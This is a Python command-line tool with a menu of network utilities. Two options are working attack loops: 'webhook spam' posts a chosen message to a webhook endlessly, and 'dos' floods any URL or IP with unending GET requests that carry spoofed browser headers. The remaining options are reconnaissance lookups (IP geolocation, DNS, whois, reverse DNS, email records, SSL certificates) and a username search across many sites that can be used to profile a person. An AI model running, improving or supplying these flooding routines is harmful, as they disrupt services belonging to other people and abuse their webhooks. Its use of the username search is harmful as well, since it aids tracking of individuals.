import datetime
import sys

import requests
from rich.console import Console

console = Console()

ip = requests.get("https://dns-lookup.com/api/ip")
data = ip.json()
cleanip = data["ip"]
now = datetime.datetime.now().hour  # noqa: DTZ005
now_full = datetime.datetime.now().strftime("%H:%M")  # noqa: DTZ005

morning = "good morning! what would you like to do."
afternoon = "good afternoon!! what would you like to do."
evening = "good evening! what would you like to do."

console.print(r"""
    ,--.  ,--.,--,--.,--,--,  ,---.  
    \  `'  /' ,-.  ||      \| .-. : 
    \    / \ '-'  ||  ||  |\   --. 
    `--'   `--`--'`--''--' `----' 
                                    """, style="cyan")

if now < 12:
    console.print(morning, style="cyan")
elif now < 18:
    console.print(afternoon, style="cyan")
else:
    console.print(evening, style="cyan")
console.print(f"ip: {cleanip}", style="cyan")
console.print(f"time: {now_full}", style="cyan")
console.print("1 - webhook spam\n2 - dos\n3 - ip lookup\n4 - dns lookup\n5 - whois\n6 - ip -> hostname\n7 - email records\n8 - ssl certs\n9 - username lookup\nq - exit", style="cyan")
choice = console.input("| ").strip()

if choice == "1":
    webhook_url = console.input("webhook url: ").strip()
    webhook_text = console.input("text: ").strip()
    data = {"content": webhook_text}

    def webhookspam():
        num = 1
        while True:
            r = requests.post(webhook_url, json=data)
            console.print(f"{num}. {r.status_code}")
            num += 1

    webhookspam()

elif choice == "2":
    dos_url = console.input("ip / url: ").strip()
    Headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",}
    def dos():
        num = 1
        try: 
            while True:
                r = requests.get(dos_url, headers=Headers)
                console.print(f"{num}. {r.status_code}")
                num += 1
        except requests.exceptions.RequestException as e:
            print("request failed:", e)
            
    dos()

elif choice == "3":
    ip = console.input("ip: ")
    def ip_lookup():
        try: 
            with console.status("sending...", spinner="aesthetic"):
                r = requests.get(f"http://ip-api.com/json/{ip}")
            console.print(r.json(), style="cyan")
        except requests.exceptions.RequestException as e:
            console.print(f"request failed: {e}", style="cyan")
    ip_lookup()

elif choice == "4":
    url = console.input("url: ")
    def dns_lookup():
        try: 
            with console.status("sending...", spinner="aesthetic"):
                r = requests.get('https://dns-lookup.com/api/dns', params={'domain': f'{url}','types': 'A,MX,TXT'})
            console.print(r.json(), style="cyan")
        except requests.exceptions.RequestException as e:
            console.print(f"request failed: {e}", style="cyan")
    dns_lookup()

elif choice == "5":
    url = console.input("url: ")
    def whois():
        try: 
            with console.status("sending...", spinner="aesthetic"):
                r = requests.get('https://dns-lookup.com/api/whois', params={'domain': f'{url}'})
            data = r.json()
            data.pop("raw", None)
            console.print(data, style="cyan")
        except requests.exceptions.RequestException as e:
            console.print(f"request failed: {e}", style="cyan")
    whois()

elif choice == "6":
    dns = console.input("dns: ")
    def reversedns():
        try: 
            with console.status("sending...", spinner="aesthetic"):
                r = requests.get('https://dns-lookup.com/api/reverse-dns', params={'ip': f'{dns}'})
            console.print(r.json(), style="cyan")
        except requests.exceptions.RequestException as e:
            console.print(f"request failed: {e}", style="cyan")
    reversedns()

elif choice == "7":
    domain = console.input("domain: ")
    def checkemail():
        try: 
            with console.status("sending...", spinner="aesthetic"):
                r = requests.get('https://dns-lookup.com/api/email', params={'domain': f'{domain}'})
            console.print(r.json(), style="cyan")
        except requests.exceptions.RequestException as e:
            console.print(f"request failed: {e}", style="cyan")
    checkemail()

elif choice == "8":
    domain = console.input("domain: ")
    def sslcerts():
        try: 
            with console.status("sending...", spinner="aesthetic"):
                r = requests.get('https://dns-lookup.com/api/ssl', params={'domain': f'{domain}'})
            console.print(r.json(), style="cyan")
        except requests.exceptions.RequestException as e:
            console.print(f"request failed: {e}", style="cyan")
    sslcerts()

elif choice == "9":
    username = console.input("username: ")
    WMN_URL = "https://raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json"
    def username_search():
        try:
            data = requests.get(WMN_URL, timeout=10).json()
            sites = data["sites"]
            total = len(sites)
            results = []
            with console.status(f"checking sites... (0/{total})", spinner="aesthetic") as status:
                for i, site in enumerate(sites, 1):
                    status.update(f"checking sites... ({i}/{total})")
                    url = site["uri_check"].replace("{account}", username)
                    try:
                        r = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
                        found = site["e_string"] in r.text and r.status_code == site["e_code"]
                    except requests.exceptions.RequestException:
                        continue
                    if found:
                        results.append({"site": site["name"], "url": url})
            console.print(results, style="cyan")
        except requests.exceptions.RequestException as e:
            console.print(f"request failed: {e}", style="cyan")
    username_search()

elif choice == "q":
    print("quitting")
    sys.exit(0)

